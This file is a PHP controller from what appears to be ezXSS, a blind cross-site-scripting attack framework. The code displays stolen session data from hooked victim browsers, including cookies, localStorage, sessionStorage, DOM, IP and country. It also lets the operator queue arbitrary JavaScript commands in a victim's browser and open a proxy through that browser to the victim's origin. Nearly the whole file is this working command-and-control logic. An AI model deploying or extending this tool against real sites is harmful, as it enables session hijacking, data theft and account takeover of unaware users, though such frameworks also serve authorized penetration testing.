<?php
use GeoIp2\Database\Reader;

class Persistent extends Controller 
{
    /**
     * Summary of rows
     * 
     * @var array
     */
    private $rows = ['id', 'uri', 'ip', 'referer', 'payload', 'user-agent', 'cookies', 'localstorage', 'sessionstorage', 'dom', 'origin', 'clientid', 'browser', 'last'];

    /**
     * Reader
     * 
     * @var object
     */
    private $reader = null;

    /**
     * Add reader to constructor
     */
    public function __construct()
    {
        parent::__construct();
        $this->reader = new Reader(__DIR__ . '/../../GeoLite2-Country.mmdb');
    }

    /**
     * Returns the session view for 0 (all).
     * 
     * @return string
     */
    public function all()
    {
        $this->isLoggedInOrExit();
        $this->view->setTitle('Online');
        $this->view->renderTemplate('persistent/index');

        $this->view->renderCondition('hasReports', true);

        $sessions = $this->model('Session')->getAll();

        foreach ($sessions as $key => $value) {
            $record = $this->reader->country($sessions[$key]['ip']);
            $sessions[$key]['browser'] = $this->parseUserAgent($sessions[$key]['user-agent']);
            $sessions[$key]['country'] = strtolower($record->country->isoCode ?? 'xx');
            $sessions[$key]['last'] = $this->parseTimestamp($sessions[$key]['time'], 'long');
            $sessions[$key]['shorturi'] = substr($sessions[$key]['uri'], 0, 50);
        }

        $this->view->renderDataset('session', $sessions);

        return $this->showContent();
    }

    /**
     * Renders the session view and returns the content.
     * 
     * @param string $clientId The client id
     * @throws Exception
     * @return string
     */
    public function session($clientId) 
    {
        $this->isLoggedInOrExit();
        $this->view->setTitle('Online');
        $this->view->renderTemplate('persistent/session');

        $clientId = explode('~', $clientId ?? '');
        $origin = $clientId[1] ?? '';
        $clientId = $clientId[0] ?? '';

        $session = $this->model('Session')->getByClientId($clientId, $origin);

        // Check report permissions
        // todo

        if($this->isPOST()) {
            try {
                $this->validateCsrfToken();

                $this->view->setContentType('application/json');

                // Check if posted data is executing command
                if ($this->getPostValue('execute') !== null) {
                    $command = $this->getPostValue('command');
                    $this->model('Console')->add($clientId, $origin, $command);
                    return json_encode(1);
                }

                // Check if posted data is getting console data
                if ($this->getPostValue('getconsole') !== null) {
                    $console = $this->model('Session')->getAllConsole($clientId, $origin);
                    return json_encode(['console' => $console]);
                }

                // Check if posted data is starting proxy
                if ($this->getPostValue('proxy') !== null) {
                    $ipport = $this->getPostValue('ipport');

                    if (!preg_match('/^([\w.-]+):\d+$/', $ipport)) {
                        throw new Exception('This does not look like a valid domain/IP with port');
                    }

                    $passOrigin = $this->getPostValue('passorigin') !== null ? '1' : '0';
                    $this->model('Console')->add($clientId, $origin, "ez_soc('$ipport', $passOrigin)");
                    throw new Exception("Proxy started on $ipport is accessible on http://$clientId.ezxss" . ($passOrigin === '1' ? " and http://$origin" : ''));
                }

            } catch (Exception $e) {
                $this->view->setContentType('text/html');
                $this->view->renderMessage($e->getMessage());
            }
        }

        // Render all rows
        $this->view->renderData('time', date('F j, Y, g:i a', $session['time']));

        $record = $this->reader->country($session['ip']);
        $this->view->renderData('country', strtolower($record->country->isoCode ?? 'xx'));

        $session['browser'] = $this->parseUserAgent($session['user-agent']);
        $session['last'] = $this->parseTimestamp($session['time'], 'long');

        $console = $this->model('Session')->getAllConsole($clientId, $origin);
        $this->view->renderData('console', $console);

        foreach ($this->rows as $value) {
            $this->view->renderData($value, $session[$value]);
        }

        return $this->showContent();

    }
}